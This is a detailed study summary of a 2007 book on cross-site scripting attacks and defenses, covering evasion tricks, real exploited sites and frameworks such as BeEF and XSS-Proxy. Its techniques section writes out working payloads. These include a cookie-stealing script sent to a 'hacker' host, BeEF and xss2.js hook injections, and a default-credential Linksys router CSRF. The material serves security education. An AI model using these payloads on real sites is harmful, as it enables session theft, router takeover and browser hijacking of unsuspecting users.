# XSS Attacks: Cross Site Scripting Exploits and Defense

ISBN: 9780080553405  |  Book #15

## One-liner
The definitive 2007 practitioner field guide to cross-site scripting: how JavaScript injection turns the browser into an attack platform against users, intranets, and trust relationships, with hundreds of working vectors, real exploited targets, and the first generation of XSS exploitation frameworks.

## Thesis
The browser is a bridge between the hostile Internet and the trusted local network, and XSS is the lever that lets an attacker stand on that bridge and act as the victim. The authors argue that XSS is vastly underestimated: it is not popup nuisance but a full attack surface that chains with CSRF, DNS rebinding, browser bugs, filter gaps, and non-HTML injection vectors (Flash, PDF, images, registry, wireless packet injection) to steal credentials, pivot into intranets, hijack routers, and self-propagate as worms. The single recurring lesson is that no client-side data can ever be trusted, and the only durable defenses are rigorous input filtering and context-correct output encoding at the server.

## Structure
### Front matter and Introduction (XSS history, taxonomy)
Establishes XSS born mid-1990s from frameset cross-domain reads, then the same-origin policy. Defines the three buckets: non-persistent (reflected), DOM-based, and persistent (HTML injection). Frames the book as a wake-up call: the Samy worm shutting down MySpace is cited as proof that a benign payload can still cripple a major site. Authors include Jeremiah Grossman, Robert RSnake Hansen, Petko D. Petkov (pdp), Anton Rager, Seth Fogie.

### Chapter 1 - Cross-site Scripting Fundamentals
Web 2.0/AJAX raises the stakes. Covers HTML, JavaScript, the DOM, XMLHttpRequest, JSON, same-origin policy, and the discovery toolkit: Burp, DOM Inspector, Web Developer, FireBug, LiveHTTPHeaders, ModifyHeaders, TamperData, GreaseMonkey. Introduces the cross-browser getXHR() pattern and the canonical cookie-theft vector new Image().src=...+document.cookie.

### Chapter 2 - The XSS Discovery Toolkit / Chapter 3 - XSS Theory
Systematizes finding XSS: the standard tester string ";!--\"<XSS>=&{()} reveals which metacharacters a filter neutralizes. Distinguishes reflected vs DOM-based (where the sink is location.hash/document.write and the payload may never reach the server, e.g. eval(location.hash.substr(1))). Maps the roughly 100 event handlers and the many injection contexts (attribute, tag, script block, CSS, URL).

### Chapter 4 - XSS Attack Methods / Advanced filter evasion
Encyclopedic evasion: String.fromCharCode obfuscation, HTML entity permutations, UTF-7 / US-ASCII / variable-width (BIG5, SHIFT_JIS) charset tricks, null bytes, CSS expression() and -moz-binding, HTML+TIME, data: base64 URIs. Non-HTML carriers: Flash getURL javascript:, PDF #javascript: in Reader <7.9, QuickTime HREFTrack/qtnext, GIF89a image backdooring. JSON hijacking via Array() constructor override (Grossman's Jan 2006 GMail contact theft). References Alexa top-500 testing and SPI Dynamics.

### Chapter 5 - Advanced XSS Attack Vectors
The exotic surface: DNS pinning and the anti-DNS-pinning escalation ladder (anti, anti-anti, anti-anti-anti) to defeat browser DNS rebinding defenses; IMAP3 on port 220 (Wade Alcorn PoC, Firefox port-block list); MHTML cross-domain read in IE 7 (RSnake perl PoC); the Apache Expect header XSS (Thiago Zaninotti, expect.swf); and intranet attacks via getComputedStyle history theft, JS login-state checkers, MyAddress.class for NAT IP, port scanning with script tags + window.stop(), and drive-by-pharming of routers.

### Chapter 6 - XSS Exploited (real-world case studies)
The book's heart: live targets. Firefox Password Manager autofill credential theft (WhiteAcid, then the RCSR MySpace bug, Reverse Cross-Site Request); spoofing entries on sex-offender registries (familywatchdog.us plus ~30 vulnerable state sites) by overwriting a ContentWhole div; Equifax search XSS chained to a phishing iframe via atomz.com outsourced search; full takeover of Cingular Xpress Mail (SEVEN backend) through the ackid session cookie, GET-based CSRF, directory traversal, and the Xpressmail Snarfer that frames-and-suck-outs an entire inbox; XSS-via-share-name to own a vulnerability scanner's HTML report (Immunity SILICA/CANVAS); Airpwn wireless packet injection to inject JS into any visited site; decompiled Flash high-score key theft; Pocket IE 4.2 cross-frame scripting and file:// access; GreaseMonkey backdoors and the Pilgrim GM_xmlhttpRequest privilege-escalation file-read bug; SnoopStick parental-spyware turned against the parent; TinyURL persistent 0day for anonymous script hosting; EZPhotoSales backdoor via cracked MD5 config and BeEF hook injection.

### Chapter 7 - Exploit Frameworks
The tooling that operationalizes everything prior. AttackAPI (GNUCITIZEN/pdp): client enumeration (getAgent, getCookies, getPlugins, getInternalIP, scanExtensions, scanStates, scanHistory), network attack (scanPorts/sweepPorts with default port table, requestCSRF against Linksys routers with default creds), browser hijacking (hijackView, hijackForm), and zombie control via channel.php + Backframe. BeEF (Wade Alcorn): zombie hooking via beefmagic.js.php, autorun alert/deface and standard modules, distributed port scanning, and inter-protocol exploitation/communication (Asterisk Manager port 5038 bindshell, ipc:bindshell, ipc:imap4). CAL9000 (OWASP): browser-based toolkit with RSnake's XSS Cheat Sheet, checklists, encoders/decoders. XSS-Proxy (Rager): persistent browser hijack via xss2.js, showDoc/scriptRequest/reportError polling loop, command modes (idle, fetch, eval, form-submit), GET/POST handoff to new targets, and the Sage RSS file:// hijack that reads the victim's local drives, mapped network shares, and admin C$ shares across the domain.

## Core ideas
- XSS is a trust-bridge attack: the browser sits between the hostile Internet and the trusted intranet, so injected JavaScript inherits the victim's network position, credentials, and same-origin reach. This reframing (not popups, but a pivot platform) is the book's central thesis.
- Three concrete XSS classes with different mechanics: non-persistent/reflected (server echoes input), DOM-based (the sink is client-side, e.g. location.hash into eval/document.write, payload may never touch the server and thus evades server-side filters), and persistent/HTML-injection (stored, fires on every view).
- The standard discovery probe ";!--\"<XSS>=&{()} is a single string that simultaneously tests how a filter treats quotes, angle brackets, comments, and special chars by inspecting how each character is reflected in View Source.
- Filter evasion is combinatorial: String.fromCharCode, entity permutations, alternate charsets (UTF-7, US-ASCII, BIG5/SHIFT_JIS variable-width), CSS expression() and -moz-binding, and event handlers mean a blacklist almost always loses; only whitelist/encoding wins.
- Chaining beats any single bug: Firefox Password Manager autofill is harmless alone and an XSS hole is harmless alone, but together they auto-fill and exfiltrate stored credentials. The class of mistake is composability of low-severity issues.
- Non-HTML injection vectors break the mental model that XSS lives in form fields: Flash getURL javascript:, PDF #javascript:, QuickTime HREFTrack, backdoored GIF89a images, a crafted Windows share name injected into a scanner's HTML report, and Airpwn wireless packet injection all deliver script.
- CSRF is the silent partner of XSS: GET-based functional endpoints (Cingular Xpress Mail delete/view/attachment) plus a predictable session cookie (ackid) let an emailed .jpg/.html run script and walk the entire inbox and even the victim's hard drive.
- Intranet and router attacks run from the browser: getInternalIP via Java/LiveConnect, script-tag port scanning with window.stop(), and requestCSRF to http://admin:admin@<gateway>/setup.cgi enabling remote management on default-credential Linksys routers (drive-by-pharming).
- DOM-relaxed file:// origins are dangerous: a file://-context hijack (Sage RSS preview bug + XSS-Proxy) can read local drives, jump drive letters, traverse mapped network shares, and reach hidden admin shares (C$, D$) on other domain hosts when the victim runs as administrator.
- Browser extensions invert the security model: GreaseMonkey's GM_xmlhttpRequest deliberately crosses origins; Pilgrim's bug let an ordinary page hijack that privileged function to read file:///C:/boot.ini, and eval(document.body.innerHTML) in user scripts trusts the page blindly.
- Exploitation frameworks turn primitives into push-button zombie control: AttackAPI + Backframe, BeEF, and XSS-Proxy all maintain a polling channel that hijacks the view, captures snapshots/forms, and relays results back, parallel to how Metasploit/CANVAS/CORE IMPACT industrialized server-side exploitation.
- Inter-protocol exploitation (Wade Alcorn/BeEF) weaponizes a browser's tolerance: a multi-part HTTP POST crafted to be valid enough for a non-HTTP service (Asterisk Manager on 5038) yields a bindshell, with the browser as the bridge to internal-only services the attacker cannot reach directly.
- Persistent XSS can be parasitically hosted: the TinyURL 0day let attackers store malicious script on TinyURL's own infrastructure, anonymizing the payload host and slowing AV/security attribution.
- The only durable defenses stated repeatedly: never trust client-supplied data (forms, Flash, Java, executables, packets, registry, URLs), filter all external input, and the user-side mitigations are weak (disabling JavaScript stops XSS but not HTML injection).

## Techniques and methods
- Cross-browser getXHR()/x() factory: try window.XMLHttpRequest, then window.createRequest, then new ActiveXObject('Msxml2.XMLHTTP') / 'Microsoft.XMLHTTP' fallbacks
- Canonical cookie exfiltration vector: "><SCRIPT>var img=new Image();img.src="http://hacker/"+document.cookie;</SCRIPT>
- DOM-based length-bypass payload: "><script>eval(location.hash.substr(1))</script>#payload (payload travels in fragment, never sent to server)
- Filter-recon string: ";!--\"<XSS>=&{()} then diff against View Source to map which metacharacters survive
- String.fromCharCode decimal obfuscation to smuggle < (60) and > (62) and full payloads past WAFs/mod_security
- innerHTML content-overwrite via document.getElementById('ContentWhole'/'content'/'rightcol').innerHTML to repaint a page with spoofed or iframe phishing content
- JSON hijacking by overriding the Array() constructor to capture a same-origin JSON response (e.g. GMail contacts), then reading it cross-domain
- requestCSRF default-credential router takeover: POST to http://admin:admin@<derived-gateway>/setup.cgi with remote_management=enable + sysPasswd, deriving gateway by replacing the last IP octet with .1
- Browser port scanning: script/img tags to target host:port plus window.stop() and timeout tuning to infer open/closed; sweepPorts supports range and CIDR notation; browsers block ports below 80 (IE does not)
- Inbox-snarfing via hidden frames: cols='0,*,0' invisible frameset, setTimeout-staged load of each message.stp URL, suckURL pulls innerHTML, escape()-encode and auto-POST to evilserver via a JS-built form (the </scr"+"ipt> split to avoid premature parser termination)
- Flash anti-cheat bypass: decompile .swf (Sothinks), lift the EncryptString function and its hardcoded key, port ActionScript to JavaScript, rebuild the signed high-score URL to inject arbitrary score/name (and XSS)
- GreaseMonkey privilege hijack: window.watch('GM_log'/'GM_apis') to capture a reference to the privileged GM_xmlhttpRequest, then GET file:///C:/boot.ini cross-origin
- XSS-Proxy hijack loop: inject <script src=http://attacker/xss2.js>, which loads showDoc()/scriptRequest()/reportError(); poll /page2 for idle/fetch/eval/form-submit commands; chunk leaked document content into 2047-char URL parameters; data stored only in Perl arrays in memory
- BeEF zombie hook: "><script src=http://[BeEF]/beef/hook/beefmagic.js.php><div " with autorun (alert/deface) and standard (steal_clipboard, javascript_command, request, visited_urls, MoBB exploits) modules
- file:// share traversal: file://///IP/share, file://///IP/C$ to read mapped and hidden admin shares across hosts when the hijacked user has administrator credentials
- John the Ripper cracking of MD5 ($1$) config hashes (EZPhotoSales galleries.txt/config.dat) by formatting them as /etc/shadow-style lines
- Dean Edwards JavaScript packer + GNUCITIZEN Atom database to compress XSS payloads to fit URL/length constraints (used in the TinyURL exploit)

## Memorable
- "The Samy Worm, the first major XSS worm, managed to shut down the popular social networking Web site MySpace" - cited as proof that even a benign payload is dangerous.
- The standard XSS test string: ";!--\"<XSS>=&{()} - inject it, then search View Source for how each character was rendered.
- Equifax search box was vulnerable; the search was outsourced to atomz.com (acquired by WestSideStory), so New York Life, Comcast, Verizon and others using the same engine shared the flaw.
- Cingular Xpress Mail is 'a CSRF playground' - the ackid cookie alone grants full inbox, attachment, document, and arbitrary-file access; the Xpressmail Snarfer used 8000ms load timers to extract every email.
- WhiteAcid's Firefox password-manager attack used String.fromCharCode-obfuscated alert(document.getElementsByName('user_pass')[0].value) with a 10-second setInterval delay to let autofill complete; the MySpace variant (Robert Chapin) was named RCSR - Reverse Cross-Site Request.
- Linksys default credentials admin:admin in requestCSRF, gateway derived by replacing the last octet with .1; success silently enables remote management on port 8080 of the WAN interface.
- XSS-Proxy chunks leaked content into 2047-character URLs and stores everything in Perl arrays in memory - kill the server and all captured data is lost; it also requires no attacker authentication, so anyone can hijack the hijacker.
- BeEF inter-protocol exploit fires at Asterisk 1.0.7 Manager on port 5038 and spawns a bindshell on port 4444 - described as 'the first public exploit of this kind,' with most Metasploit exploits potentially portable this way.
- Firefox and Opera cannot scan ports below 80 (a deliberate security feature); IE has no such restriction.
- Pocket IE 4.2 (Windows Mobile 2003SE and below) allowed cross-frame scripting AND file:// access to ROM files (cmnd.htm, initdb.ini, Win_Start.2bp, Startup), plus http://user:pass@site and hex-encoded URL obfuscation; fixed only in Windows Mobile 5.0.
- The familywatchdog.us sex-offender registry XSS overwrote the 'ContentWhole' div - the authors note it ironically became a 'Content Hole'; about 30 state/county registries were found similarly vulnerable.
- TinyURL 0day: shrink 'a' to get tinyurl.com/kbv, then shrink tinyurl.com/kbv<script>alert('xss')</script> to host persistent script on TinyURL's own infrastructure.
- Pilgrim's GreaseMonkey bug used window.watch on GM_log/GM_apis to steal GM_xmlhttpRequest and read file:///C:/boot.ini from an innocent page.
- The repeated golden rule, capitalized in the text on client-side trust: 'IT IS NEVER SECURE.'

## Curriculum fit
Strong fit as the historical and primitive-level foundation of the security-research track. Although 2007-vintage (specific browser versions, Linksys defaults, and Flash/PDF vectors are dated), the structural lessons are exactly the  methodology applied to the client tier: map trust relationships (browser as bridge between hostile and trusted networks), chain low+medium issues into critical paths (password-manager + XSS, CSRF + predictable session ID + directory traversal), and treat non-standard surfaces (Flash, PDF, images, wireless packets, registry shares, file:// origins) as first-class attack vectors. For creativity, the book is a masterclass in lateral injection-point thinking (inject script into a scanner's report via a share name; host payloads on TinyURL itself). For leadership/reporting, every case study is a war-story narrative from reconnaissance to impact, the exact 'report as art' standard. For agentic-AI research, Chapter 7 is the most relevant: AttackAPI/BeEF/XSS-Proxy are the direct conceptual ancestors of autonomous browser-driving agents and zombie-control channels (polling loops, command queues, distributed port scanning across a botnet) - the same orchestration patterns now reappearing in LLM-driven browser agents and multi-agent C2, making this a useful primer on the failure modes (no auth on the control channel, in-memory-only state, blind CSRF) that modern agent infrastructure re-encounters. Caveat for the reader: this extraction stops at end of Chapter 7, so the XSS-worm propagation math (linear/Warhol/exponential, Samy) and the prevention chapter are referenced but not present and should be sourced elsewhere if needed.
